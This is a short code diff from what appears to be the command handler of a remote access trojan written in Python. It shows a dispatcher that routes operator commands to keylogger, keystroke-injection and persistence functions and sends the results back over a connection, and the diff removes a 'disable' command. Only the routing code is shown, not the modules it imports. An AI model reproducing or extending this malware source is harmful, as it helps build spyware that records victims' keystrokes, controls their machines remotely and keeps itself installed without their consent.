@@ -11,7 +11,6 @@ from foreign.client_handling.download import *
 from foreign.client_handling.website import *
 from foreign.client_handling.encrypt import *
 from foreign.client_handling.recover import *
-from foreign.client_handling.disable import *
 from foreign.client_handling.system import *
 from binary.data_handling.send_data import *
 from foreign.client_handling.upload import *
@@ -54,8 +53,6 @@ def command_handling(conn, data):
 		send_data(conn, keylogger(data['action_type']), settings)
 	elif message == 'keystroke':
 		send_data(conn, keystroke(data['inject']), settings)
-	elif message == 'disable':
-		send_data(conn, disable(data['unlock']), settings)
 	elif message == 'persistence':
 		send_data(conn, persistence(data['action_type'], (data['safe'], data['safe_timeout'])), settings)
 	elif message == 'system':
